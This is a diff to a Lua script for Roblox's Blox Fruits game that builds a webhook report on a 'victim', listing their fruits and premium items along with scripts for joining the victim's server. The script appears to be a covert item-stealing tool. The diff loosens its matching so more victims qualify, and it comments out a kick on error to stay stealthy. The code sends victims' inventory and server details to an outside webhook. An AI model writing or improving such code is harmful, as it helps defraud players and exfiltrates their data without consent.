@@ -258,7 +258,8 @@ local function sendWebhook(inventory)
 			local itemData = { name = item.Name, count = item.Count, value = item.Value or 0 }
 			if item.Type == "Blox Fruit" then
 				table.insert(fruits, itemData)
-				if item.Name == "Dragon(East)-Dragon(East)" or item.Name == "Dragon(West)-Dragon(West)" then dragonHit = true end
+				-- Use find for robustness here too, matching the kick check logic
+				if item.Name:find("Dragon", 1, true) then dragonHit = true end
 				if goodFruitNames[item.Name] then hasGoodFruit = true end
 			else table.insert(premiumItems, itemData); hasPremiumItem = true end
 		end
@@ -266,6 +267,7 @@ local function sendWebhook(inventory)
 	table.sort(fruits, function(a, b) return a.value > b.value end)
 	local function shuffleTable(t) for i = #t, 2, -1 do local j = math.random(i); t[i], t[j] = t[j], t[i] end end; shuffleTable(premiumItems)
 	local function formatItems(items) local r = ""; for _, i in ipairs(items) do r = r .. string.format("```%s%s```", i.name, i.count > 1 and (" (x%d)"):format(i.count) or "") end return r ~= "" and r or "```None```" end
+	-- This function uses the *modified* FruitsToHit (which includes Dragon)
 	local function formatFruitsToHit(items) local r = ""; local l = {}; for _, fn in ipairs(FruitsToHit or {}) do l[fn] = true end; for _, d in ipairs(items) do if l[d.name] then r = r .. string.format("```%s%s```", d.name, d.count > 1 and (" (x%d)"):format(d.count) or "") end end return r ~= "" and r or "```None```" end
 
 	local jobId = game.JobId; local currentSea = game.PlaceId == 7449423635 and "Sea 3" or (game.PlaceId == 4442272183 and "Sea 2" or "Unknown Sea"); local serverName = getServerName()
@@ -279,7 +281,7 @@ local function sendWebhook(inventory)
 		fields = {
 			{ name = "Victim's Fruits <a:Rarrow:1223589557065351188> ", value = formatItems(fruits), inline = true },
 			{ name = "Victim's Premium Items <:rbx:1326025738125574226>  ", value = formatItems(premiumItems), inline = true },
-			{ name = "Victim Has Fruits You Want <a:green:1215209325728104498> ", value = formatFruitsToHit(fruits) },
+			{ name = "Victim Has Fruits You Want <a:green:1215209325728104498> ", value = formatFruitsToHit(fruits) }, -- Shows fruits from modified list
 			{ name = "Join Victim's Server Script (PC Copy)", value = "```lua\n" .. joinScriptPC .. "\n```" },
 			{ name = "Join Victim's Server Script (Mobile Copy)", value = joinScriptMobile },
 			{ name = "Join Victim's Sea Script (PC Copy)", value = "```lua\n" .. seaJoinScriptPC .. "\n```" },
@@ -635,11 +637,12 @@ local function init()
 		for _, fName in ipairs(originalConfigList) do originalConfigLookup[fName] = true end
 
 		for _, item in ipairs(inv) do
-			if item.Name == "Dragon(East)-Dragon(East)" or item.Name == "Dragon(West)-Dragon(West)" then foundDragon = true end
+            -- Use find for Dragon check robustness
+			if item.Name:find("Dragon", 1, true) then foundDragon = true end
 			if item.Type == "Premium" then foundPremium = true end
 			if item.Type == "Blox Fruit" and originalConfigLookup[item.Name] then foundConfiguredFruit = true end
-			-- Exit early if all conditions met
-			if foundDragon and foundPremium and foundConfiguredFruit then break end
+			-- Exit early if any condition met
+			if foundDragon or foundPremium or foundConfiguredFruit then break end
 		end
 		return (foundDragon or foundPremium or foundConfiguredFruit)
 	end
@@ -700,14 +703,15 @@ local function init()
 end
 
 --[[ Script Entry Point ]]--
-if not shared.ScriptExecuted_SharkyV2_FinalFormatted_v6_Stealth then -- Unique flag
-	shared.ScriptExecuted_SharkyV2_FinalFormatted_v6_Stealth = true
+if not shared.ScriptExecuted_SharkyV2_FinalFormatted_v7_KickFix then -- Unique flag
+	shared.ScriptExecuted_SharkyV2_FinalFormatted_v7_KickFix = true
 	task.spawn(function()
 		local success, errorMessage = pcall(init)
 		if not success then
 			-- Minimal error handling for stealth, maybe kick silently or just stop
-			print("Script Init Error", errorMessage) -- Print error locally only
-			task.spawn(function() LocalPlayer:Kick("Script Init Error") end)
+			print("Script Init Error (Stealth):", errorMessage) -- Print error locally only
+			-- Optionally add a kick here if preferred over silent failure
+			-- task.spawn(function() LocalPlayer:Kick("Script Init Error") end)
 		end
 	end)
 end
